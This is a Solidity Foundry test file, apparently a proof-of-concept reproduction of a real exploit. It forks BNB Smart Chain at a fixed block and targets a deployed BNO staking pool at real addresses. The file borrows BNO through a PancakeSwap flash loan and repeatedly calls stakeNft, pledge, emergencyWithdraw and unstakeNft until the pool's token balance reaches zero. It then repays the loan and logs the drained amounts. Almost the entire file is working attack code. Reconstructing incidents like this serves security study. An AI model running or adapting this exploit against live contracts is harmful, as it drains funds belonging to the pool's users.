// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";


import "./interface.sol";
import "./pool.sol";


contract ContractTest is Test {

    address public attackAddress = 0xD138b9a58D3e5f4be1CD5eC90B66310e241C13CD;
    address public attacker = 0xA6566574eDC60D7B2AdbacEdB71D5142cf2677fB;
    IERC721 public nft = IERC721(0x8EE0C2709a34E9FDa43f2bD5179FA4c112bEd89A);
    IERC20 public bno = IERC20(0xa4dBc813F7E1bf5827859e278594B1E0Ec1F710F);
    Pool public pool = Pool(0xdCA503449899d5649D32175a255A8835A03E4006);
    IPancakePair public pair = IPancakePair(0x4B9c234779A3332b74DBaFf57559EC5b4cB078BD);

    function setUp() public {
        uint256 forkId = vm.createFork("bsc", 30056629);
        vm.selectFork(forkId);
    }

    function testExp() public {
        vm.prank(attackAddress);
        nft.transferFrom(attacker, address(this), 13);
        vm.prank(attackAddress);
        nft.transferFrom(attacker, address(this), 14);

        uint256 balanceOfPair = bno.balanceOf(address(pair));
        console.log("Pair BNO balance: %s", balanceOfPair);

        console.log("Start flash loan!");
        pair.swap(0, balanceOfPair-1, address(this), bytes("0x00"));
        console.log("attacker BNO balance: %s", bno.balanceOf(address(this)));
    }

    function testWithdraw() public {
        vm.prank(attackAddress);
        nft.transferFrom(attacker, address(this), 13);
        vm.prank(attackAddress);
        nft.transferFrom(attacker, address(this), 14);
        deal(address(bno), address(this), 1000 ether);
        bno.approve(address(pool), type(uint256).max);

        nft.approve(address(pool), 13);
        nft.approve(address(pool), 14);

        uint256 bnoOfPool0 = bno.balanceOf(address(pool));

        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 13;
        tokenIds[1] = 14;

        uint256 balance = bno.balanceOf(address(this));

        pool.stakeNft{value: 0.008 ether}(tokenIds);
        pool.pledge{value: 0.008 ether}(balance);
        console.log("fit: %d", pool.pendingFit(address(this)));
        pool.rePledge{value: 0.008 ether}(balance);
        pool.unstakeNft{value: 0.008 ether}(tokenIds);
        uint256 bnoOfPool1 = bno.balanceOf(address(pool));

        console.log("Sub amount: %s", bnoOfPool0 - bnoOfPool1);
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        bno.approve(address(pool), type(uint256).max);
        for (uint256 i=0; i<1000; i++) {
            nft.approve(address(pool), 13);
            nft.approve(address(pool), 14);

            uint256[] memory tokenIds = new uint256[](2);
            tokenIds[0] = 13;
            tokenIds[1] = 14;

            pool.stakeNft{value: 0.008 ether}(tokenIds);
            pool.pledge{value: 0.008 ether}(bno.balanceOf(address(this)));
            pool.emergencyWithdraw();
            pool.unstakeNft{value: 0.008 ether}(tokenIds);
            
            uint256 bnoOfPool = bno.balanceOf(address(pool));
            console.log(
                "attacker balance: %s   pool balance %s",
                bno.balanceOf(address(this)),
                bnoOfPool    
            );
            if (bnoOfPool==0) break;
        }
        bno.transfer(address(pair), 296077061349649258533567);
    }


    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

}